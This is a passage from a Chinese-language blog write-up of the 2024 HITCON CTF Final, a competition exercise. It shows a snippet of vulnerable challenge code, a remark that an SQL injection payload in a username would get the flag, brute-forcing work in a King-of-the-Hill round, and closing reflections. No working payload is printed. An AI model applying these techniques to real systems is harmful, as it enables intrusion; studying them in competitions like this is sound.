enable = <span class="string">&quot;&quot;</span> </span><br><span class="line">    timestamp = <span class="string">&quot;&quot;</span><span class="number">55</span></span><br><span class="line">    <span class="keyword">if</span> connect()[<span class="number">1</span>].fetchone():</span><br><span class="line">        enable = <span class="string">&quot;enabled&quot;</span></span><br><span class="line">        timestamp = connect()[<span class="number">1</span>].fetchone()[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> connect()[<span class="number">1</span>].fetchone()[<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">if</span> ((time.time() - connect()[<span class="number">1</span>].fetchone()[<span class="number">1</span>].timestamp()) &gt;= <span class="number">31536000</span>):</span><br><span class="line">            flag = read_flag()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    connect()[<span class="number">1</span>].close()</span><br><span class="line">    connect()[<span class="number">0</span>].close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Content-Type: text/html\n&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>((<span class="built_in">open</span>(<span class="string">&quot;template/light.html&quot;</span>).read() % (enable, username, timestamp, flag)), flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>這邊判斷拿flag的條件是時間戳大於一年，取個人名帶著sqli payload下去就可以ㄌ<br><del>不過我們最後只有patch沒有打，因為昨天 JWT 重放的攻擊夠用ㄌ</del><br>回到第三題的KoH，利用後續leak到的get_recipe端點就可以拿到各元素的組成方法（但詢問元素只能是現在已知的）<br><img src="https://hackmd.io/_uploads/BJ35dN0byx.png" alt="image"><br>然後發現名字是一段句子的元素，看來後端有個LLM被摧殘?!  </p>
+<p>早上我都在跑腳本爆破新元素，最後去猜別隊的元素組成方法其實就是DFS回朔現在知道的元素，但這塊就交給隊友(Vincent)寫腳本，我只專注在爆破💣<br><img src="https://hackmd.io/_uploads/BkcbKERWyx.png" alt="image"><br>對，這題其實有點坐牢 🫠  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>賽後記分板<br><img src="https://hackmd.io/_uploads/HygLtVA-yl.png" alt="image">  </p>
+<p>很榮幸的宣布在我的攻擊、隊友的部署及Patch的合作下，fulu這題我們是第四高分！！！  </p>
+<p>Service Status:<br><img src="https://hackmd.io/_uploads/BJOFFE0-1e.png" alt="image"><br>我們的服務都還活著，Infra隊友是神 &lt;(_ _)&gt;  </p>
+<p>打得很開心，超喜歡這種打攻防和挖洞的感覺，爆東西也好爽ww<br>期許自己未來能變成更強大，可以獨當一面的駭客！  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-1"><span class="toc-number">2.</span> <span class="toc-text">Day 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-Attack-through-reusing-JWT-Token"><span class="toc-number">2.1.</span> <span class="toc-text">Oracle Attack through reusing JWT Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI"><span class="toc-number">2.2.</span> <span class="toc-text">LFI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Race-Condition"><span class="toc-number">2.3.</span> <span class="toc-text">Race Condition</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injections"><span class="toc-number">2.4.</span> <span class="toc-text">SQL Injections</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%B5%90"><span class="toc-number">2.5.</span> <span class="toc-text">小結</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day2"><span class="toc-number">3.</span> <span class="toc-text">Day2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">4.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/11/10/hitcon-final-2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&text=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&title=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&is_video=false&description=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2024 HITCON CTF FINAL 隨筆&body=Check out this article: http://wha13.github.io/2024/11/10/hitcon-final-2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&title=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&title=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&title=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&title=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&name=2024 HITCON CTF FINAL 隨筆&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/11/10/hitcon-final-2024/&t=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2026
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
